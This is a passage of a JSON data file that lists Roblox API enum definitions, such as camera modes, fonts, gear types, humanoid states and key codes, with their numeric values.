umItem","Name":"MouseLockSwitch","tags":[],"Value":1,"Enum":"ControlMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ControlMode"},{"type":"Enum","Name":"CoreGuiType","tags":[]},{"type":"EnumItem","Name":"PlayerList","tags":[],"Value":0,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Health","tags":[],"Value":1,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Backpack","tags":[],"Value":2,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Chat","tags":[],"Value":3,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"All","tags":[],"Value":4,"Enum":"CoreGuiType"},{"type":"Enum","Name":"CreatorType","tags":[]},{"type":"EnumItem","Name":"User","tags":[],"Value":0,"Enum":"CreatorType"},{"type":"EnumItem","Name":"Group","tags":[],"Value":1,"Enum":"CreatorType"},{"type":"Enum","Name":"CurrencyType","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Robux","tags":[],"Value":1,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Tix","tags":[],"Value":2,"Enum":"CurrencyType"},{"type":"Enum","Name":"CustomCameraMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"CustomCameraMode"},{"type":"Enum","Name":"DevCameraOcclusionMode","tags":[]},{"type":"EnumItem","Name":"Zoom","tags":[],"Value":0,"Enum":"DevCameraOcclusionMode"},{"type":"EnumItem","Name":"Invisicam","tags":[],"Value":1,"Enum":"DevCameraOcclusionMode"},{"type":"Enum","Name":"DevComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevComputerCameraMovementMode"},{"type":"Enum","Name":"DevComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":3,"Enum":"DevComputerMovementMode"},{"type":"Enum","Name":"DevTouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevTouchCameraMovementMode"},{"type":"Enum","Name":"DevTouchMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":5,"Enum":"DevTouchMovementMode"},{"type":"Enum","Name":"DialogPurpose","tags":[]},{"type":"EnumItem","Name":"Quest","tags":[],"Value":0,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Help","tags":[],"Value":1,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Shop","tags":[],"Value":2,"Enum":"DialogPurpose"},{"type":"Enum","Name":"DialogTone","tags":[]},{"type":"EnumItem","Name":"Neutral","tags":[],"Value":0,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Friendly","tags":[],"Value":1,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Enemy","tags":[],"Value":2,"Enum":"DialogTone"},{"type":"Enum","Name":"EasingDirection","tags":[]},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"EasingDirection"},{"type":"Enum","Name":"EasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Sine","tags":[],"Value":1,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quad","tags":[],"Value":3,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quart","tags":[],"Value":4,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quint","tags":[],"Value":5,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":6,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":7,"Enum":"EasingStyle"},{"type":"Enum","Name":"EnviromentalPhysicsThrottle","tags":[]},{"type":"EnumItem","Name":"DefaultAuto","tags":[],"Value":0,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Disabled","tags":[],"Value":1,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip2","tags":[],"Value":3,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip4","tags":[],"Value":4,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip8","tags":[],"Value":5,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip16","tags":[],"Value":6,"Enum":"EnviromentalPhysicsThrottle"},{"type":"Enum","Name":"ErrorReporting","tags":[]},{"type":"EnumItem","Name":"DontReport","tags":[],"Value":0,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Prompt","tags":[],"Value":1,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Report","tags":[],"Value":2,"Enum":"ErrorReporting"},{"type":"Enum","Name":"ExplosionType","tags":[]},{"type":"EnumItem","Name":"NoCraters","tags":[],"Value":0,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"Craters","tags":[],"Value":1,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"CratersAndDebris","tags":[],"Value":2,"Enum":"ExplosionType"},{"type":"Enum","Name":"FilterResult","tags":[]},{"type":"EnumItem","Name":"Rejected","tags":[],"Value":1,"Enum":"FilterResult"},{"type":"EnumItem","Name":"Accepted","tags":[],"Value":0,"Enum":"FilterResult"},{"type":"Enum","Name":"Font","tags":[]},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"Font"},{"type":"EnumItem","Name":"Arial","tags":[],"Value":1,"Enum":"Font"},{"type":"EnumItem","Name":"ArialBold","tags":[],"Value":2,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSans","tags":[],"Value":3,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansBold","tags":[],"Value":4,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansLight","tags":[],"Value":5,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansItalic","tags":[],"Value":6,"Enum":"Font"},{"type":"Enum","Name":"FontSize","tags":[]},{"type":"EnumItem","Name":"Size8","tags":[],"Value":0,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size9","tags":[],"Value":1,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size10","tags":[],"Value":2,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size11","tags":[],"Value":3,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size12","tags":[],"Value":4,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size14","tags":[],"Value":5,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size18","tags":[],"Value":6,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size24","tags":[],"Value":7,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size36","tags":[],"Value":8,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size48","tags":[],"Value":9,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size28","tags":[],"Value":10,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size32","tags":[],"Value":11,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size42","tags":[],"Value":12,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size60","tags":[],"Value":13,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size96","tags":[],"Value":14,"Enum":"FontSize"},{"type":"Enum","Name":"FormFactor","tags":[]},{"type":"EnumItem","Name":"Symmetric","tags":[],"Value":0,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":1,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Plate","tags":[],"Value":2,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":3,"Enum":"FormFactor"},{"type":"Enum","Name":"FrameStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatBlue","tags":[],"Value":1,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxSquare","tags":[],"Value":2,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxRound","tags":[],"Value":3,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatGreen","tags":[],"Value":4,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatRed","tags":[],"Value":5,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"DropShadow","tags":[],"Value":6,"Enum":"FrameStyle"},{"type":"Enum","Name":"FramerateManagerMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"FramerateManagerMode"},{"type":"Enum","Name":"FriendRequestEvent","tags":[]},{"type":"EnumItem","Name":"Issue","tags":[],"Value":0,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Revoke","tags":[],"Value":1,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Accept","tags":[],"Value":2,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Deny","tags":[],"Value":3,"Enum":"FriendRequestEvent"},{"type":"Enum","Name":"FriendStatus","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"NotFriend","tags":[],"Value":1,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"Friend","tags":[],"Value":2,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestSent","tags":[],"Value":3,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestReceived","tags":[],"Value":4,"Enum":"FriendStatus"},{"type":"Enum","Name":"FunctionalTestResult","tags":[]},{"type":"EnumItem","Name":"Passed","tags":[],"Value":0,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Warning","tags":[],"Value":1,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Error","tags":[],"Value":2,"Enum":"FunctionalTestResult"},{"type":"Enum","Name":"GearGenreSetting","tags":[]},{"type":"EnumItem","Name":"AllGenres","tags":[],"Value":0,"Enum":"GearGenreSetting"},{"type":"EnumItem","Name":"MatchingGenreOnly","tags":[],"Value":1,"Enum":"GearGenreSetting"},{"type":"Enum","Name":"GearType","tags":[]},{"type":"EnumItem","Name":"MeleeWeapons","tags":[],"Value":0,"Enum":"GearType"},{"type":"EnumItem","Name":"RangedWeapons","tags":[],"Value":1,"Enum":"GearType"},{"type":"EnumItem","Name":"Explosives","tags":[],"Value":2,"Enum":"GearType"},{"type":"EnumItem","Name":"PowerUps","tags":[],"Value":3,"Enum":"GearType"},{"type":"EnumItem","Name":"NavigationEnhancers","tags":[],"Value":4,"Enum":"GearType"},{"type":"EnumItem","Name":"MusicalInstruments","tags":[],"Value":5,"Enum":"GearType"},{"type":"EnumItem","Name":"SocialItems","tags":[],"Value":6,"Enum":"GearType"},{"type":"EnumItem","Name":"BuildingTools","tags":[],"Value":7,"Enum":"GearType"},{"type":"EnumItem","Name":"Transport","tags":[],"Value":8,"Enum":"GearType"},{"type":"Enum","Name":"Genre","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"Genre"},{"type":"EnumItem","Name":"TownAndCity","tags":[],"Value":1,"Enum":"Genre"},{"type":"EnumItem","Name":"Fantasy","tags":[],"Value":2,"Enum":"Genre"},{"type":"EnumItem","Name":"SciFi","tags":[],"Value":3,"Enum":"Genre"},{"type":"EnumItem","Name":"Ninja","tags":[],"Value":4,"Enum":"Genre"},{"type":"EnumItem","Name":"Scary","tags":[],"Value":5,"Enum":"Genre"},{"type":"EnumItem","Name":"Pirate","tags":[],"Value":6,"Enum":"Genre"},{"type":"EnumItem","Name":"Adventure","tags":[],"Value":7,"Enum":"Genre"},{"type":"EnumItem","Name":"Sports","tags":[],"Value":8,"Enum":"Genre"},{"type":"EnumItem","Name":"Funny","tags":[],"Value":9,"Enum":"Genre"},{"type":"EnumItem","Name":"WildWest","tags":[],"Value":10,"Enum":"Genre"},{"type":"EnumItem","Name":"War","tags":[],"Value":11,"Enum":"Genre"},{"type":"EnumItem","Name":"SkatePark","tags":[],"Value":12,"Enum":"Genre"},{"type":"EnumItem","Name":"Tutorial","tags":[],"Value":13,"Enum":"Genre"},{"type":"Enum","Name":"GraphicsMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":1,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D9","tags":[],"Value":3,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D11","tags":[],"Value":2,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"OpenGL","tags":[],"Value":4,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"NoGraphics","tags":[],"Value":5,"Enum":"GraphicsMode"},{"type":"Enum","Name":"HandlesStyle","tags":[]},{"type":"EnumItem","Name":"Resize","tags":[],"Value":0,"Enum":"HandlesStyle"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"HandlesStyle"},{"type":"Enum","Name":"HttpContentType","tags":[]},{"type":"EnumItem","Name":"ApplicationJson","tags":[],"Value":0,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationXml","tags":[],"Value":1,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationUrlEncoded","tags":[],"Value":2,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextPlain","tags":[],"Value":3,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextXml","tags":[],"Value":4,"Enum":"HttpContentType"},{"type":"Enum","Name":"HumanoidDisplayDistanceType","tags":[]},{"type":"EnumItem","Name":"Viewer","tags":[],"Value":0,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"Subject","tags":[],"Value":1,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"HumanoidDisplayDistanceType"},{"type":"Enum","Name":"HumanoidRigType","tags":[]},{"type":"EnumItem","Name":"R6","tags":[],"Value":0,"Enum":"HumanoidRigType"},{"type":"EnumItem","Name":"R15","tags":[],"Value":1,"Enum":"HumanoidRigType"},{"type":"Enum","Name":"HumanoidStateType","tags":[]},{"type":"EnumItem","Name":"FallingDown","tags":[],"Value":0,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Running","tags":[],"Value":8,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"RunningNoPhysics","tags":[],"Value":10,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Climbing","tags":[],"Value":12,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"StrafingNoPhysics","tags":[],"Value":11,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Ragdoll","tags":[],"Value":1,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"GettingUp","tags":[],"Value":2,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Jumping","tags":[],"Value":3,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Landed","tags":[],"Value":7,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Flying","tags":[],"Value":6,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Freefall","tags":[],"Value":5,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Seated","tags":[],"Value":13,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"PlatformStanding","tags":[],"Value":14,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Dead","tags":[],"Value":15,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Swimming","tags":[],"Value":4,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Physics","tags":[],"Value":16,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"None","tags":[],"Value":18,"Enum":"HumanoidStateType"},{"type":"Enum","Name":"InOut","tags":[]},{"type":"EnumItem","Name":"Edge","tags":[],"Value":0,"Enum":"InOut"},{"type":"EnumItem","Name":"Inset","tags":[],"Value":1,"Enum":"InOut"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"InOut"},{"type":"Enum","Name":"InfoType","tags":[]},{"type":"EnumItem","Name":"Asset","tags":[],"Value":0,"Enum":"InfoType"},{"type":"EnumItem","Name":"Product","tags":[],"Value":1,"Enum":"InfoType"},{"type":"Enum","Name":"InputType","tags":[]},{"type":"EnumItem","Name":"NoInput","tags":[],"Value":0,"Enum":"InputType"},{"type":"EnumItem","Name":"LeftTread","tags":[],"Value":1,"Enum":"InputType"},{"type":"EnumItem","Name":"RightTread","tags":[],"Value":2,"Enum":"InputType"},{"type":"EnumItem","Name":"Steer","tags":[],"Value":3,"Enum":"InputType"},{"type":"EnumItem","Name":"Throtle","tags":[],"Value":4,"Enum":"InputType"},{"type":"EnumItem","Name":"UpDown","tags":[],"Value":6,"Enum":"InputType"},{"type":"EnumItem","Name":"Action1","tags":[],"Value":7,"Enum":"InputType"},{"type":"EnumItem","Name":"Action2","tags":[],"Value":8,"Enum":"InputType"},{"type":"EnumItem","Name":"Action3","tags":[],"Value":9,"Enum":"InputType"},{"type":"EnumItem","Name":"Action4","tags":[],"Value":10,"Enum":"InputType"},{"type":"EnumItem","Name":"Action5","tags":[],"Value":11,"Enum":"InputType"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":12,"Enum":"InputType"},{"type":"EnumItem","Name":"Sin","tags":[],"Value":13,"Enum":"InputType"},{"type":"Enum","Name":"JointCreationMode","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"Surface","tags":[],"Value":1,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"JointCreationMode"},{"type":"Enum","Name":"JointType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":22,"Enum":"JointType"},{"type":"EnumItem","Name":"Rotate","tags":[],"Value":6,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateP","tags":[],"Value":7,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateV","tags":[],"Value":8,"Enum":"JointType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":9,"Enum":"JointType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":1,"Enum":"JointType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":3,"Enum":"JointType"},{"type":"Enum","Name":"KeyCode","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backspace","tags":[],"Value":8,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tab","tags":[],"Value":9,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Clear","tags":[],"Value":12,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Return","tags":[],"Value":13,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":19,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Escape","tags":[],"Value":27,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Space","tags":[],"Value":32,"Enum":"KeyCode"},{"type":"EnumItem","Name":"QuotedDouble","tags":[],"Value":34,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Hash","tags":[],"Value":35,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Dollar","tags":[],"Value":36,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Percent","tags":[],"Value":37,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Ampersand","tags":[],"Value":38,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Quote","tags":[],"Value":39,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftParenthesis","tags":[],"Value":40,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightParenthesis","tags":[],"Value":41,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Asterisk","tags":[],"Value":42,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Plus","tags":[],"Value":43,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Comma","tags":[],"Value":44,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Minus","tags":[],"Value":45,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Period","tags":[],"Value":46,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Slash","tags":[],"Value":47,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Zero","tags":[],"Value":48,"Enum":"KeyCode"},{"type":"EnumItem","Name":"One","tags":[],"Value":49,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Two","tags":[],"Value":50,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Three","tags":[],"Value":51,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Four","tags":[],"Value":52,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Five","tags":[],"Value":53,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Six","tags":[],"Value":54,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Seven","tags":[],"Value":55,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Eight","tags":[],"Value":56,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Nine","tags":[],"Value":57,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Colon","tags":[],"Value":58,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Semicolon","tags":[],"Value":59,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LessThan","tags":[],"Value":60,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Equals","tags":[],"Value":61,"Enum":"KeyCode"},{"type":"EnumItem","Name":"GreaterThan","tags":[],"Value":62,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Question","tags":[],"Value":63,"Enum":"KeyCode"},{"type":"EnumItem","Name":"At","tags":[],"Value":64,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftBracket","tags":[],"Value":91,"Enum":"KeyCode"},{"type":"EnumItem","Name":"BackSlash","tags":[],"Value":92,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightBracket","tags":[],"Value":93,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Caret","tags":[],"Value":94,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Underscore","tags":[],"Value":95,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backquote","tags":[],"Value":96,"Enum":"KeyCode"},{"type":"EnumItem","Name":"A","tags":[],"Value":97,"Enum":"KeyCode"},{"type":"EnumItem","Name":"B","tags":[],"Value":98,"Enum":"KeyCode"},{"type":"EnumItem","Name":"C","tags":[],"Value":99,"Enum":"KeyCode"},{"type":"EnumItem","Name":"D","tags":[],"Value":100,"Enum":"KeyCode"},{"type":"EnumItem","Name":"E","tags":[],"Value":101,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F","tags":[],"Value":102,"Enum":"KeyCode"},{"type":"EnumItem","Name":"G","tags":[],"Value":103,"Enum":"KeyCode"},{"type":"EnumItem","Name":"H","tags":[],"Value":104,"Enum":"KeyCode"},{"type":"EnumItem","Name":"I","tags":[],"Value":105,"Enum":"KeyCode"},{"type":"EnumItem","Name":"J","tags":[],"Value":106,"Enum":"KeyCode"},{"type":"EnumItem","Name":"K","tags":[],"Value":107,"Enum":"KeyCode"},{"type":"EnumItem","Name":"L","tags":[],"Value":108,"Enum":"KeyCode"},{"type":"EnumItem","Name":"M","tags":[],"Value":109,"Enum":"KeyCode"},{"type":"EnumItem","Name":"N","tags":[],"Value":110,"Enum":"KeyCode"},{"type":"EnumItem","Name":"O","tags":[],"Value":111,"Enum":"KeyCode"},{"type":"EnumItem","Name":"P","tags":[],"Value":112,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Q","tags":[],"Value":113,"Enum":"KeyCode"},{"type":"EnumItem","Name":"R","tags":[],"Value":114,"Enum":"KeyCode"},{"type":"EnumItem","Name":"S","tags":[],"Value":115,"Enum":"KeyCode"},{"type":"EnumItem","Name":"T","tags":[],"Value":116,"Enum":"KeyCode"},{"type":"EnumItem","Name":"U","tags":[],"Value":117,"Enum":"KeyCode"},{"type":"EnumItem","Name":"V","tags":[],"Value":118,"Enum":"KeyCode"},{"type":"EnumItem","Name":"W","tags":[],"Value":119,"Enum":"KeyCode"},{"type":"EnumItem","Name":"X","tags":[],"Value":120,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Y","tags":[],"Value":121,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Z","tags":[],"Value":122,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftCurly","tags":[],"Value":123,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pipe","tags":[],"Value":124,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightCurly","tags":[],"Value":125,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tilde","tags":[],"Value":126,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Delete","tags":[],"Value":127,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadZero","tags":[],"Value":256,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadOne","tags":[],"Value":257,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadTwo","tags":[],"Value":258,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadThree","tags":[],"Value":259,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFour","tags":[],"Value":260,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFive","tags":[],"Value":261,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSix","tags":[],"Value":262,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSeven","tags":[],"Value":263,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEight","tags":[],"Value":264,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadNine","tags":[],"Value":265,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPeriod","tags":[],"Value":266,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadDivide","tags":[],"Value":267,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMultiply","tags":[],"Value":268,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMinus","tags":[],"Value":269,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPlus","tags":[],"Value":270,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEnter","tags":[],"Value":271,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEquals","tags":[],"Value":272,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Up","tags":[],"Value":273,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Down","tags":[],"Value":274,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Right","tags":[],"Value":275,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Left","tags":[],"Value":276,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Insert","tags":[],"Value":277,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Home","tags":[],"Value":278,"Enum":"KeyCode"},{"type":"EnumItem","Name":"End","tags":[],"Value":279,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":280,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":281,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftShift","tags":[],"Value":304,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightShift","tags":[],"Value":303,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftMeta","tags":[],"Value":310,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightMeta","tags":[],"Value":309,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftAlt","tags":[],"Value":308,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightAlt","tags":[],"Value":307,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftControl","tags":[],"Value":306,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightControl","tags":[],"Value":305,"Enum":"KeyCode"},{"type":"EnumItem","Name":"CapsLock","tags":[],"Value":301,"Enum":"KeyCode"},{"type":"EnumItem","Name":"NumLock","tags":[],"Value":30